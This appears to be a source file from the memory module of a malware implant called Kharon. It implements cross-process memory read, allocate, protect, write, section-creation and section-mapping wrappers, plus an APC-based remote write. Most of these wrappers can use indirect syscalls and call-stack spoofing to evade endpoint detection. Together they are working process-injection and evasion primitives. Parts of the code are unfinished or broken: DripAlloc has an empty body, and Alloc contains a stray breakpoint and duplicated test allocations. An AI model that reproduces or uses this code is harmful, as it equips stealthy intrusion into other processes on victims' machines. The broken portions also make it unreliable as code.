#include <Kharon.h>

auto DECLFN Memory::Read(
    _In_  PVOID   Base,
    _In_  BYTE*   Buffer,
    _In_  SIZE_T  Size,
    _Out_ PSIZE_T Reads,
    _In_  HANDLE  Handle
) -> BOOL {
    const UINT32 Flags = Self->KH_SYSCALL_FLAGS;
    NTSTATUS    Status = STATUS_UNSUCCESSFUL;

    if ( ! ( Flags & (SYSCALL_INDIRECT | SYSCALL_SPOOF) ) ) {
        return NT_SUCCESS( Self->Ntdll.NtReadVirtualMemory(
            Handle, Base, Buffer, Size, (PULONG)Reads
        ));
    }

    UPTR Address = ( Flags & SYSCALL_INDIRECT )
        ? (UPTR)Self->Sys->Ext[Sys::Read].Instruction
        : (UPTR)Self->Ntdll.NtReadVirtualMemory;

    UPTR ssn = ( Flags & SYSCALL_INDIRECT )
        ? (UPTR)Self->Sys->Ext[Sys::Read].ssn
        : 0;


    if ( Flags & SYSCALL_INDIRECT && ! (Flags & SYSCALL_SPOOF) ) {
        SyscallExec( Sys::Read, Status, Handle, Base, Buffer, Size, Reads )
    } else {
        Status = Self->Spf->Call(
            Address, ssn, (UPTR)Handle, (UPTR)Base,
            (UPTR)Buffer, (UPTR)Size, (UPTR)Reads
        );
    }

    Self->Usf->NtStatusToError(Status);

    return NT_SUCCESS(Status);
}

auto DECLFN Memory::Alloc(
    _In_  PVOID   Base,
    _In_  SIZE_T  Size,
    _In_  ULONG   AllocType,
    _In_  ULONG   Protect,
    _In_  HANDLE  Handle
) -> PVOID {
    UINT32 Flags = Self->KH_SYSCALL_FLAGS;

    KhDbg("alloc flags: %X", Flags);

    NTSTATUS Status      = STATUS_UNSUCCESSFUL;
    PVOID    BaseAddress = Base;
    SIZE_T   RegionSize  = Size;

    if ( ! ( Flags & ( SYSCALL_INDIRECT | SYSCALL_SPOOF) ) ) {
        KhDbg("execute without syscall and spoof");
        if ( Handle == NtCurrentProcess() ) {
            return Self->Krnl32.VirtualAlloc( Base, Size, AllocType, Protect );
        } else {
            return Self->Krnl32.VirtualAllocEx( Handle, Base, Size, AllocType, Protect );
        }
    }

    UPTR Address = ( Flags & SYSCALL_INDIRECT )
        ? (UPTR)Self->Sys->Ext[Sys::Alloc].Instruction
        : (UPTR)Self->Ntdll.NtAllocateVirtualMemory;

    UPTR ssn = (Flags & SYSCALL_INDIRECT)
        ? (UPTR)Self->Sys->Ext[Sys::Alloc].ssn
        : 0;

    if ( Flags & SYSCALL_INDIRECT && ! (Flags & SYSCALL_SPOOF) ) {
        KhDbg("executing indirect syscall without spoof");
        SyscallExec( Sys::Alloc, Status, Handle, &BaseAddress, 0, &RegionSize, AllocType, Protect );
    } else {
        asm("int3");
        Status = Self->Ntdll.NtAllocateVirtualMemory( 
            Handle, &BaseAddress,
            0, &RegionSize, AllocType, (UPTR)Protect 
        );
        KhDbg("%X", Status);
        KhDbg("%p", BaseAddress);
        BaseAddress = nullptr;
        KhDbg("executing indirect syscall with spoof");
        Status = Self->Spf->Call(
            Address, 0, (UPTR)Handle, (UPTR)&BaseAddress,
            0, (UPTR)&RegionSize, (UPTR)AllocType, (UPTR)Protect
        );
        KhDbg("%X", Status);
        KhDbg("%p", BaseAddress);
        BaseAddress = nullptr;
        Status = Self->Spf->Call(
            Address, ssn, (UPTR)Handle, (UPTR)&BaseAddress,
            0, (UPTR)&RegionSize, (UPTR)AllocType, (UPTR)Protect
        );
        KhDbg("%X", Status);
        KhDbg("%p", BaseAddress);
    }
    
    Self->Usf->NtStatusToError( Status );
    
    return NT_SUCCESS( Status ) ? BaseAddress : nullptr;
}

auto DECLFN Memory::DripAlloc(
    _In_  PVOID   Base,
    _In_  SIZE_T  Size,
    _In_  ULONG   AllocType,
    _In_  ULONG   Protect,
    _In_  HANDLE  Handle
) -> PVOID {
    
}

auto DECLFN Memory::Protect(
    _In_  PVOID   Base,
    _In_  SIZE_T  Size,
    _In_  ULONG   NewProt,
    _Out_ ULONG  *OldProt,
    _In_  HANDLE  Handle
) -> BOOL {
    const UINT32 Flags  = Self->KH_SYSCALL_FLAGS;
    NTSTATUS     Status = STATUS_UNSUCCESSFUL;


    if ( ! ( Flags & (SYSCALL_INDIRECT | SYSCALL_SPOOF) ) ) {
        if ( Handle == NtCurrentProcess() ) {
            return Self->Krnl32.VirtualProtect( Base, Size, NewProt, OldProt );
        } else {
            return Self->Krnl32.VirtualProtectEx( Handle, Base, Size, NewProt, OldProt );
        }
    }

    UPTR Address = ( Flags & SYSCALL_INDIRECT )
        ? (UPTR)Self->Sys->Ext[Sys::Protect].Instruction
        : (UPTR)Self->Ntdll.NtProtectVirtualMemory;

    UPTR ssn = ( Flags & SYSCALL_INDIRECT )
        ? (UPTR)Self->Sys->Ext[Sys::Protect].ssn
        : 0;

    if ( Flags & SYSCALL_INDIRECT && ! (Flags & SYSCALL_SPOOF) ) {
        SyscallExec( Sys::Protect, Status, Handle, &Base, &Size, NewProt, OldProt );
    } else {
        Status = Self->Spf->Call(
            Address, ssn, (UPTR)Handle, (UPTR)&Base,
            (UPTR)&Size, (UPTR)NewProt, (UPTR)OldProt
        );
    }

    Self->Usf->NtStatusToError( Status );

    return NT_SUCCESS( Status );
}

auto DECLFN Memory::WriteAPC(
    _In_ HANDLE Handle,
    _In_ PVOID  Base,
    _In_ BYTE*  Buffer,
    _In_ ULONG  Size
) -> BOOL {
    G_KHARON
    HANDLE   ThreadHandle = NULL;
    NTSTATUS NtStatus     = STATUS_SUCCESS;

    ULONG ThreadId = 0;
    PVOID Dummy    = (PVOID)1;
    ThreadHandle = Self->Td->Create( Handle, (PVOID)Self->Ntdll.RtlExitUserThread, 0, 0, CREATE_SUSPENDED, &ThreadId );

    if ( Size ) {
        for ( INT i = 0; i < Size; i++ ) {
            NtStatus = Self->Td->QueueAPC( (PVOID)Self->Ntdll.khRtlFillMemory, ThreadHandle, ( Buffer + i ), Dummy, ( Buffer + i ) );
        }
    } else {
        NtStatus = Self->Td->QueueAPC( (PVOID)Self->Ntdll.khRtlFillMemory, ThreadHandle, Buffer, 0, NULL );
    }
   
    if ( NtStatus != STATUS_SUCCESS ) {
        Self->Krnl32.TerminateThread( ThreadHandle, EXIT_SUCCESS );
        Self->Ntdll.NtClose( ThreadHandle );
        return FALSE;
    } else {
        Self->Krnl32.ResumeThread( ThreadHandle );
        Self->Krnl32.WaitForSingleObject( ThreadHandle, INFINITE );
        Self->Ntdll.NtClose( ThreadHandle );
        return TRUE;
    }
}

auto DECLFN Memory::Write(
    _In_ PVOID  Base,
    _In_ BYTE*  Buffer,
    _In_ ULONG  Size,
    _In_ HANDLE Handle
) -> BOOL {
    const UINT32 Flags   = Self->KH_SYSCALL_FLAGS;
    NTSTATUS     Status  = STATUS_UNSUCCESSFUL;
    SIZE_T       Written = 0;

    if ( ! ( Flags & (SYSCALL_INDIRECT | SYSCALL_SPOOF) ) ) {
        return NT_SUCCESS( Self->Ntdll.NtWriteVirtualMemory(
            Handle, Base, Buffer, Size, &Written
        ));
    }

    UPTR Address = (Flags & SYSCALL_INDIRECT)
        ? (UPTR)Self->Sys->Ext[Sys::Write].Instruction
        : (UPTR)Self->Ntdll.NtWriteVirtualMemory;

    UPTR ssn = (Flags & SYSCALL_INDIRECT)
        ? (UPTR)Self->Sys->Ext[Sys::Write].ssn
        : 0;


    if ( Flags & SYSCALL_INDIRECT && ! (Flags & SYSCALL_SPOOF) ) {
        SyscallExec( Sys::Write, Status, Handle, Base, Buffer, Size, &Written );
    } else {
        Status = Self->Spf->Call(
            Address, ssn, (UPTR)Handle, (UPTR)Base,
            (UPTR)Buffer, (UPTR)Size, (UPTR)&Written
        );
    }
    
    Self->Usf->NtStatusToError( Status );

    return NT_SUCCESS( Status );
}

auto DECLFN Memory::Free(
    _In_ PVOID  Base,
    _In_ SIZE_T Size,
    _In_ ULONG  FreeType,
    _In_ HANDLE Handle
) -> BOOL {
    const UINT32 Flags  = Self->KH_SYSCALL_FLAGS;
    NTSTATUS     Status = STATUS_UNSUCCESSFUL;

    if ( ! Handle ) {
        if ( ! ( Flags & (SYSCALL_INDIRECT | SYSCALL_SPOOF) ) ) {
            return NT_SUCCESS( Self->Ntdll.NtFreeVirtualMemory(
                Handle, &Base, &Size, FreeType
            ));
        }
    }

    UPTR Address = ( Flags & SYSCALL_INDIRECT )
        ? (UPTR)Self->Sys->Ext[Sys::Free].Instruction
        : (UPTR)Self->Ntdll.NtFreeVirtualMemory;

    UPTR ssn = ( Flags & SYSCALL_INDIRECT )
        ? (UPTR)Self->Sys->Ext[Sys::Free].ssn
        : 0;

    if ( Flags & SYSCALL_INDIRECT && ! (Flags & SYSCALL_SPOOF) ) {
        SyscallExec( Sys::Free, Status, Handle, &Base, &Size, FreeType );
    } else {
        Status = Self->Spf->Call(
            Address, ssn, (UPTR)Handle, (UPTR)&Base, (UPTR)&Size, (UPTR)FreeType
        );
    }

    Self->Usf->NtStatusToError( Status );

    return NT_SUCCESS( Status );
}

auto DECLFN Memory::MapView(
    _In_        HANDLE          SectionHandle,
    _In_        HANDLE          ProcessHandle,
    _Inout_     PVOID*          BaseAddress,
    _In_        ULONG_PTR       ZeroBits,
    _In_        SIZE_T          CommitSize,
    _Inout_opt_ PLARGE_INTEGER  SectionOffset,
    _Inout_     PSIZE_T         ViewSize,
    _In_        SECTION_INHERIT InheritDisposition,
    _In_        ULONG           AllocationType,
    _In_        ULONG           PageProtection
) -> NTSTATUS {
    const UINT32 Flags = Self->KH_SYSCALL_FLAGS;
    NTSTATUS Status = STATUS_UNSUCCESSFUL;

    if ( ! ( Flags & (SYSCALL_INDIRECT | SYSCALL_SPOOF) ) ) {
        return Self->Ntdll.NtMapViewOfSection(
            SectionHandle, ProcessHandle, BaseAddress, ZeroBits,
            CommitSize, SectionOffset, ViewSize, InheritDisposition,
            AllocationType, PageProtection
        );
    }

    UPTR Address = ( Flags & SYSCALL_INDIRECT )
        ? (UPTR)Self->Sys->Ext[Sys::MapView].Instruction
        : (UPTR)Self->Ntdll.NtMapViewOfSection;

    UPTR ssn = (Flags & SYSCALL_INDIRECT)
        ? (UPTR)Self->Sys->Ext[Sys::MapView].ssn
        : 0;


    if ( Flags & SYSCALL_INDIRECT && ! (Flags & SYSCALL_SPOOF) ) {
        SyscallExec( 
            Sys::MapView, Status, SectionHandle, ProcessHandle, BaseAddress, 
            ZeroBits, CommitSize, SectionOffset, ViewSize, InheritDisposition,
            AllocationType, PageProtection 
        );
    } else {
        Status = Self->Spf->Call(
            Address, ssn, (UPTR)SectionHandle, (UPTR)ProcessHandle,
            (UPTR)BaseAddress, (UPTR)ZeroBits, (UPTR)CommitSize,
            (UPTR)SectionOffset, (UPTR)ViewSize, (UPTR)InheritDisposition,
            (UPTR)AllocationType, (UPTR)PageProtection
        );
    }

    return Status;
}

auto DECLFN Memory::CreateSection(
    _Out_    PHANDLE           SectionHandle,
    _In_     ACCESS_MASK       DesiredAccess,
    _In_opt_ POBJECT_ATTRIBUTES ObjectAttributes,
    _In_opt_ PLARGE_INTEGER    MaximumSize,
    _In_     ULONG             SectionPageProtection,
    _In_     ULONG             AllocationAttributes,
    _In_opt_ HANDLE            FileHandle
) -> NTSTATUS {
    const UINT32 Flags = Self->KH_SYSCALL_FLAGS;
    NTSTATUS Status = STATUS_UNSUCCESSFUL;

    if ( ! ( Flags & (SYSCALL_INDIRECT | SYSCALL_SPOOF) ) ) {
        return Self->Ntdll.NtCreateSection(
            SectionHandle, DesiredAccess, ObjectAttributes,
            MaximumSize, SectionPageProtection, AllocationAttributes,
            FileHandle
        );
    }

    UPTR Address = ( Flags & SYSCALL_INDIRECT )
        ? (UPTR)Self->Sys->Ext[Sys::CrSectn].Instruction
        : (UPTR)Self->Ntdll.NtCreateSection;

    UPTR ssn = ( Flags & SYSCALL_INDIRECT )
        ? (UPTR)Self->Sys->Ext[Sys::CrSectn].ssn
        : 0;

    if ( Flags & SYSCALL_INDIRECT && ! (Flags & SYSCALL_SPOOF) ) {
        SyscallExec( 
            Sys::CrSectn, Status, SectionHandle, DesiredAccess, ObjectAttributes,
            MaximumSize, SectionPageProtection, AllocationAttributes, FileHandle
        );
    } else {
        Status = Self->Spf->Call(
            Address, ssn, (UPTR)SectionHandle, (UPTR)DesiredAccess,
            (UPTR)ObjectAttributes, (UPTR)MaximumSize,
            (UPTR)SectionPageProtection, (UPTR)AllocationAttributes,
            (UPTR)FileHandle
        );
    }

    return Status;
}